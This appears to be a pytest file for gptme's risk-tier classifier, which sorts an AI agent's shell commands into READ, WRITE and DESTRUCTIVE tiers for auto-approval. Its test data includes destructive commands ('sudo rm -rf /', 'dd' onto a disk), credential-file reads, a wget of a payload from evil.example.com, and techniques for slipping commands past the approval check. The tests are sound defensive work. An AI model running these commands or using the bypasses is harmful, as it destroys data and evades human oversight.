"""Tests for tool risk tier classification."""

import pytest

from gptme.tools.base import ToolUse
from gptme.tools.risk import RiskTier, classify_tool_risk


def _tu(tool: str, content: str = "") -> ToolUse:
    """Helper to build a minimal ToolUse for testing."""
    return ToolUse(tool=tool, args=[], content=content)


# ── READ-tier tools ────────────────────────────────────────────────────────────


def test_read_tool_is_tier1() -> None:
    assert classify_tool_risk(_tu("read", "/etc/hostname")) == RiskTier.READ


def test_web_search_is_tier1() -> None:
    assert classify_tool_risk(_tu("web_search", "gptme docs")) == RiskTier.READ


def test_vision_is_tier1() -> None:
    assert classify_tool_risk(_tu("vision")) == RiskTier.READ


def test_rag_is_tier1() -> None:
    assert classify_tool_risk(_tu("rag", "search query")) == RiskTier.READ


# ── READ-tier shell commands ────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "cat /etc/hosts",
        "head -20 README.md",
        "tail -5 logs/app.log",
        "ls -la /tmp",
        "echo hello",
        "grep -r 'TODO' src/",
        "rg 'class Foo' .",
        "diff a.py b.py",
        "find . -name '*.py'",
        "wc -l src/*.py",
        "git status",
        "git log --oneline -5",
        "git diff HEAD",
        "git branch -a",
        "gh issue list --repo owner/repo",
        "gh pr view 123",
        "stat myfile.txt",
        "which python3",
        "pwd",
        "df -h",
        "ps aux",
    ],
)
def test_shell_safe_reads_are_tier1(cmd: str) -> None:
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.READ, (
        f"Expected READ for: {cmd!r}"
    )


# ── WRITE-tier tools ───────────────────────────────────────────────────────────


def test_write_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("write", "new content")) == RiskTier.WRITE


def test_patch_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("patch", "+added line")) == RiskTier.WRITE


def test_save_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("save", "content")) == RiskTier.WRITE


def test_append_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("append", "more content")) == RiskTier.WRITE


def test_python_tool_is_tier2() -> None:
    assert classify_tool_risk(_tu("python", "x = 1 + 2")) == RiskTier.WRITE


@pytest.mark.parametrize(
    "cmd",
    [
        "mkdir -p /tmp/mydir",
        "touch /tmp/newfile",
        "cp src.txt dst.txt",
        "mv old.txt new.txt",
        "pip install --user requests",
        "git add .",
        "git commit -m 'fix'",
        "npm install",
        "sed -i 's/old/new/' file.txt",
    ],
)
def test_shell_write_ops_are_tier2(cmd: str) -> None:
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.WRITE, (
        f"Expected WRITE for: {cmd!r}"
    )


# ── DESTRUCTIVE-tier tools ─────────────────────────────────────────────────────


def test_computer_tool_is_tier3() -> None:
    assert classify_tool_risk(_tu("computer")) == RiskTier.DESTRUCTIVE


def test_tmux_tool_is_tier3() -> None:
    assert classify_tool_risk(_tu("tmux", "rm -rf /")) == RiskTier.DESTRUCTIVE


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf /tmp/important",
        "rm -f locked.txt",
        "git push origin master",
        "git push --force",
        "sudo apt install python3",
        "dd if=/dev/zero of=/dev/sda",
        "sudo rm -rf /",
        "curl -X POST https://api.example.com/data -d '{}'",
        "curl --data 'key=value' https://example.com/submit",
    ],
)
def test_shell_destructive_ops_are_tier3(cmd: str) -> None:
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.DESTRUCTIVE, (
        f"Expected DESTRUCTIVE for: {cmd!r}"
    )


# ── Redirection / chaining bypass prevention (Greptile finding) ───────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "cat /etc/passwd > /tmp/stolen",  # safe prefix, write redirect
        "echo hello > /tmp/out",  # echo with redirect
        "cat file >> /tmp/log",  # append redirect
        "grep pattern src/ > /tmp/results",  # grep with redirect
        "ls | tee /tmp/listing",  # pipe to tee (writes file)
        "cat file | tee -a /tmp/log",  # tee append
    ],
)
def test_shell_redirect_or_pipe_write_is_not_tier1(cmd: str) -> None:
    """Commands with write redirections or pipe-to-write must not be auto-approved."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, f"Expected ≥WRITE for redirect/pipe-write: {cmd!r}"


@pytest.mark.parametrize(
    "cmd",
    [
        "grep foo | head -10",  # safe pipe chain
        "cat file | wc -l",  # safe pipe chain
        "git log | grep pattern",  # safe pipe chain
        "ls | grep pattern",  # safe pipe chain
    ],
)
def test_shell_safe_pipe_chains_are_tier1(cmd: str) -> None:
    """Piped chains where every part is safe should still be READ."""
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.READ, (
        f"Expected READ for safe pipe chain: {cmd!r}"
    )


# ── find with mutating actions (Greptile finding) ─────────────────────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "find . -delete",
        "find /tmp -name '*.tmp' -delete",
        "find . -exec rm {} +",
        "find . -exec touch /tmp/created {} +",
        "find . -execdir chmod 777 {} \\;",
        "find . -ok rm {} \\;",
        "find . -okdir mv {} /backup \\;",
        "find . -name '*.log' -fls /tmp/listing.txt",
        "find . -fprint /tmp/files.txt",
        "find . -fprint0 /tmp/files.txt",
    ],
)
def test_find_mutating_flags_are_not_tier1(cmd: str) -> None:
    """find commands with state-changing actions must not be auto-approved."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, f"Expected ≥WRITE for mutating find: {cmd!r}"


@pytest.mark.parametrize(
    "cmd",
    [
        "TMPDIR=/tmp find . -delete",  # env prefix hides the mutating find
        "DEBUG=1 find . -exec rm {} +",  # env prefix + exec
        "FOO=bar find /tmp -name '*.tmp' -execdir chmod 777 {} \\;",  # env prefix + execdir
    ],
)
def test_env_prefixed_mutating_find_is_not_tier1(cmd: str) -> None:
    """find with env-var prefix and mutating flags must not be auto-approved."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for env-prefixed mutating find: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "find . -name '*.py'",
        "find . -type f -name '*.log'",
        "find /tmp -maxdepth 2 -newer ref.txt",
        "find . -name '*.py' -print",
        "find . -ls",
    ],
)
def test_find_read_only_flags_are_tier1(cmd: str) -> None:
    """Plain find queries without mutating actions remain READ-tier."""
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.READ, (
        f"Expected READ for read-only find: {cmd!r}"
    )


# ── Command substitution bypass prevention (Greptile finding) ─────────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "echo $(touch /tmp/created)",  # safe prefix hides nested state-change
        "echo `touch /tmp/created`",  # backtick variant
        "cat $(rm -f /tmp/important)",  # cat prefix, destructive subst
        "ls $(mkdir /tmp/newdir)",  # ls prefix, write subst
        "echo $(curl -X POST https://api.example.com)",  # echo prefix, network write
        "grep foo $(bash /tmp/payload.sh)",  # grep prefix, arbitrary command
    ],
)
def test_shell_cmd_substitution_is_not_tier1(cmd: str) -> None:
    """Commands with $() or backtick substitution must not be auto-approved as READ."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for command substitution: {cmd!r}"
    )


# ── Edge cases ─────────────────────────────────────────────────────────────────


def test_git_push_in_multiline_script_is_tier3() -> None:
    """A script that does a read then a git push should be DESTRUCTIVE."""
    cmd = "git status\ngit push origin master"
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.DESTRUCTIVE


def test_rm_without_force_flag_is_write() -> None:
    """Plain 'rm file.txt' (no -f or -r) is WRITE, not DESTRUCTIVE."""
    cmd = "rm /tmp/tempfile.txt"
    # rm without -f or -r is reversible (trash) in many setups; tier it as WRITE
    result = classify_tool_risk(_tu("shell", cmd))
    assert result in (RiskTier.WRITE, RiskTier.DESTRUCTIVE)  # acceptable either way


def test_sed_without_inplace_is_at_least_write() -> None:
    """sed can write files via 'w' and execute commands via 'e' — not safe to auto-approve.

    Even without -i, sed scripts can write files (w/W commands) or execute shell
    commands (e command). Removed from safe-prefix list; use grep/cat for read-only
    text processing.
    """
    cmd = "sed 's/old/new/' file.txt"
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for sed (removed from allowlist): {cmd!r}"
    )


def test_sed_with_inplace_is_write() -> None:
    """sed -i modifies files in-place — should not be READ."""
    cmd = "sed -i 's/old/new/' file.txt"
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE


@pytest.mark.parametrize(
    "cmd",
    [
        "sed -ni 's/secret//' file.txt",  # -n suppresses, -i writes in-place
        "sed -in 's/secret//' file.txt",  # same flags, different order
        "sed -ni '/pattern/d' file.txt",  # deletes matching lines in-place
    ],
)
def test_sed_combined_inplace_flags_are_write(cmd: str) -> None:
    """sed with combined flags including -i must not be auto-approved as READ."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for sed with in-place flag in combination: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "awk '{system(\"rm -f /tmp/evil\")}' input.txt",  # system() executes shell
        "awk '{print > \"/etc/hosts\"}' data.txt",  # output redirect writes files
        "awk '{print | \"tee /etc/cron.d/evil\"}' f.txt",  # pipe to shell command
    ],
)
def test_awk_with_side_effects_is_write(cmd: str) -> None:
    """awk can write files and execute shell — must not be auto-approved as READ."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for awk with side effects: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "env rm -rf /tmp/work",  # env runs rm — state-changing
        "env ls /etc",  # env ls runs ls — but env itself is risky
        "env VAR=val python3 script.py",  # env runs python3 with modified env
    ],
)
def test_env_running_command_is_write(cmd: str) -> None:
    """env <cmd> executes cmd with modified environment — not a READ-only operation."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for env running a command: {cmd!r}"
    )


def test_printenv_is_tier1() -> None:
    """printenv only prints variables — safe READ."""
    assert classify_tool_risk(_tu("shell", "printenv PATH")) == RiskTier.READ


def test_unknown_tool_defaults_to_write() -> None:
    assert classify_tool_risk(_tu("mystery_tool", "content")) == RiskTier.WRITE


def test_browser_navigation_is_tier1() -> None:
    assert classify_tool_risk(_tu("browser", "https://docs.gptme.org")) == RiskTier.READ


def test_browser_form_submit_is_tier2() -> None:
    assert classify_tool_risk(_tu("browser", "click submit button")) == RiskTier.WRITE


# ── Greptile security findings — regression tests ─────────────────────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "command ls",  # command builtin runs arbitrary executables
        "command rm -rf /tmp/important",  # command + destructive
        "command bash /tmp/payload.sh",  # command + arbitrary script
    ],
)
def test_command_builtin_arbitrary_exec_is_not_tier1(cmd: str) -> None:
    """'command <executable>' is not safe — only 'command -v' (existence check) is."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for command-builtin bypass: {cmd!r}"
    )


def test_command_v_is_tier1() -> None:
    """'command -v <name>' is a pure existence check — safe READ."""
    assert classify_tool_risk(_tu("shell", "command -v python3")) == RiskTier.READ


@pytest.mark.parametrize(
    "cmd",
    [
        "python3 -c 'print(open(\"/etc/passwd\").read())'",  # reads file via print arg
        'python3 -c \'print(open("/tmp/evil", "w").write("x"))\'',  # writes via arg
        "python -c 'print(os.system(\"rm -rf /tmp\"))'",  # os.system via print arg
    ],
)
def test_python_c_print_bypass_is_not_tier1(cmd: str) -> None:
    """'python -c print(...)' can have side-effecting args — not safe to auto-approve."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for python -c print bypass: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "wget -q https://example.com/file.tar.gz",  # downloads and saves to disk
        "wget -q https://malicious.example.com/payload.sh",  # saves payload
        "wget -q https://example.com/data.json",  # writes file
    ],
)
def test_wget_q_file_download_is_not_tier1(cmd: str) -> None:
    """wget -q still writes downloaded content to disk — not a READ-only operation."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, f"Expected ≥WRITE for wget file download: {cmd!r}"


@pytest.mark.parametrize(
    "cmd",
    [
        "sed 'w /tmp/output.txt' input.txt",  # w command writes matched lines to file
        "sed -n '/pattern/w /tmp/matches.txt' input.txt",  # -n + w command writes
        "sed -e 'e touch /tmp/created' input.txt",  # e command executes shell cmd
        "sed -e 'e' input.txt",  # e with no arg executes current pattern space
        "sed '1e cat /etc/passwd' input.txt",  # address + e command
    ],
)
def test_sed_script_write_exec_commands_are_not_tier1(cmd: str) -> None:
    """sed w/e script commands write files or execute shell — not safe to auto-approve.

    These bypass the old -i flag check. sed is now removed from the safe-prefix
    allowlist entirely to prevent this class of bypass.
    """
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for sed with write/exec script command: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "openssl x509 -out cert.pem -in cert.der",  # writes certificate to file
        "openssl dgst -sign key.pem -out sig.bin data.txt",  # signs and writes
        "openssl dgst -hmac secret -sha256 data.txt",  # HMAC uses secret key
        "openssl x509 -signkey key.pem -in csr.pem",  # signing with private key
        "openssl x509 -in cert.pem -text",  # was formerly READ — now conservatively WRITE
        "openssl verify cert.pem",  # was formerly READ — now conservatively WRITE
    ],
)
def test_openssl_output_and_sign_options_are_not_tier1(cmd: str) -> None:
    """openssl -out/-sign/-signkey write files or perform signing — not safe to auto-approve.

    The -out and -sign/-signkey options bypass the old subcommand allowlist. openssl
    is now removed from the safe-prefix allowlist to prevent this class of bypass.
    """
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for openssl with output/signing option: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "echo ok & touch /tmp/owned",  # background op hides trailing mutation
        "git status & rm -rf /tmp/work",  # safe prefix, destructive background cmd
        "ls & wget -O /tmp/payload https://evil.example.com",  # ls prefix, write bg
    ],
)
def test_shell_background_op_is_not_tier1(cmd: str) -> None:
    """Standalone & (background operator) must be treated as a command separator."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for background-op bypass: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "cat <(touch /tmp/created)",  # safe outer prefix, destructive nested cmd
        "grep pattern <(rm -rf /tmp/work)",  # grep outer, destructive inside <()
        "diff <(cat file1) <(rm file2)",  # second substitution is destructive
        "echo <(bash /tmp/payload.sh)",  # arbitrary script via process sub
    ],
)
def test_shell_process_substitution_is_not_tier1(cmd: str) -> None:
    """Commands with <(...) Bash process substitution must not be auto-approved as READ."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for process substitution: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "GIT_EXTERNAL_DIFF=/path/to/helper git diff",  # launches external helper
        "GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=no' git fetch",  # SSH override
        "GIT_EXEC_PATH=/tmp/evil git status",  # overrides git executable search path
        "GIT_PAGER=evil_pager git log",  # pager executes arbitrary command
    ],
)
def test_env_prefixed_git_is_not_tier1(cmd: str) -> None:
    """Env-var-prefixed git is unsafe: GIT_EXTERNAL_DIFF etc. redirect git to arbitrary helpers."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, f"Expected ≥WRITE for env-prefixed git: {cmd!r}"


# ── RiskTier ordering ──────────────────────────────────────────────────────────


def test_risk_tiers_are_ordered() -> None:
    assert RiskTier.READ < RiskTier.WRITE < RiskTier.DESTRUCTIVE


def test_risk_tier_comparison_with_int() -> None:
    """The _AUTO_APPROVE_TIER_MAX constant (int) must compare correctly."""
    assert RiskTier.READ <= 1
    assert RiskTier.WRITE > 1
    assert RiskTier.DESTRUCTIVE > 1


# ── &> and >& combined-redirect bypass prevention (bob-ai-review finding) ────


@pytest.mark.parametrize(
    "cmd",
    [
        "echo hi &> /tmp/out",  # bash combined stdout+stderr redirect to file
        "echo hi &>/tmp/out",  # no space — still a write
        "cat file &> /tmp/captured",  # &> with safe prefix
        "echo hi >& /tmp/out",  # >& to a non-fd path writes the file
        "echo hi >&/tmp/out",  # >& without space — still a write
    ],
)
def test_shell_combined_redirect_is_not_tier1(cmd: str) -> None:
    """&> and >& bash redirections that write to files must not be auto-approved."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, f"Expected ≥WRITE for combined redirect: {cmd!r}"


@pytest.mark.parametrize(
    "cmd",
    [
        "echo hi >&2",  # redirect stdout to stderr fd — safe, no file write
        "echo hi 1>&2",  # explicit fd form — safe
        "cat file 2>&1",  # redirect stderr to stdout — safe
    ],
)
def test_shell_fd_redirect_is_tier1(cmd: str) -> None:
    """fd redirections like >&2 and 2>&1 must remain READ-tier (no file write)."""
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.READ, (
        f"Expected READ for fd redirect: {cmd!r}"
    )


# ── git branch/tag mutating-flag bypass (bob-ai-review finding) ──────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "git branch -D feature",  # force-delete branch
        "git branch -d merged-branch",  # delete merged branch
        "git branch -m old new",  # rename branch
        "git branch -M old new",  # force-rename branch
        "git branch -c old new",  # copy branch
        "git branch -C old new",  # force-copy branch
        "git branch -u origin/main",  # set upstream
        "git branch -f master HEAD",  # force-move branch
        "git branch --delete feature",  # long form delete
        "git branch --move old new",  # long form rename
        "git branch --copy old new",  # long form copy
        "git branch --set-upstream-to=origin/main main",  # set upstream long
    ],
)
def test_git_branch_mutating_flags_are_not_tier1(cmd: str) -> None:
    """git branch with delete/rename/copy/upstream flags must not be auto-approved."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, f"Expected ≥WRITE for mutating git branch: {cmd!r}"


@pytest.mark.parametrize(
    "cmd",
    [
        "git branch -a",  # list all branches
        "git branch -r",  # list remote branches
        "git branch -v",  # verbose list
        "git branch -vv",  # extra verbose list
        "git branch --list",  # explicit list
        "git branch",  # bare — lists local branches
    ],
)
def test_git_branch_list_forms_are_tier1(cmd: str) -> None:
    """git branch in list-only mode must remain READ-tier."""
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.READ, (
        f"Expected READ for list-mode git branch: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "git tag v1.0",  # creates lightweight tag
        "git tag -a v1.0 -m 'release'",  # annotated tag
        "git tag -d v1.0",  # delete tag
        "git tag -f v1.0",  # force-create/overwrite tag
        "git tag -m 'msg' v1.0",  # tag with inline message
        "git tag --delete v1.0",  # long form delete
        "git tag --annotate v1.0",  # long form annotate
    ],
)
def test_git_tag_mutating_forms_are_not_tier1(cmd: str) -> None:
    """git tag operations that create/delete/modify tags must not be auto-approved."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, f"Expected ≥WRITE for mutating git tag: {cmd!r}"


@pytest.mark.parametrize(
    "cmd",
    [
        "git tag",  # bare — lists all tags
        "git tag -l",  # explicit list
        "git tag --list",  # long form list
        "git tag -l 'v1.*'",  # list with glob filter
    ],
)
def test_git_tag_list_forms_are_tier1(cmd: str) -> None:
    """git tag in list-only mode must remain READ-tier."""
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.READ, (
        f"Expected READ for list-mode git tag: {cmd!r}"
    )


# ── python3 -m json.tool outfile bypass (bob-ai-review finding) ──────────────


@pytest.mark.parametrize(
    "cmd",
    [
        "python3 -m json.tool data.json output.json",  # two positional args
        "python3 -m json.tool infile outfile",  # generic two-arg form
        "python3 -m json.tool --outfile output.json",  # explicit outfile flag
        "python3 -m json.tool --outfile out.json data.json",  # --outfile + infile
        "python3 -m json.tool --indent 4 data.json output.json",  # flag + two positionals
    ],
)
def test_json_tool_with_outfile_is_not_tier1(cmd: str) -> None:
    """python3 -m json.tool with an outfile argument writes a file — not READ-safe."""
    result = classify_tool_risk(_tu("shell", cmd))
    assert result >= RiskTier.WRITE, (
        f"Expected ≥WRITE for json.tool with outfile: {cmd!r}"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "python3 -m json.tool",  # reads stdin, writes to stdout only
        "python3 -m json.tool data.json",  # reads file, writes to stdout only
        "cat data.json | python3 -m json.tool",  # piped, json.tool alone is safe
    ],
)
def test_json_tool_read_forms_are_tier1(cmd: str) -> None:
    """python3 -m json.tool without an outfile must remain READ-tier."""
    assert classify_tool_risk(_tu("shell", cmd)) == RiskTier.READ, (
        f"Expected READ for read-only json.tool: {cmd!r}"
    )
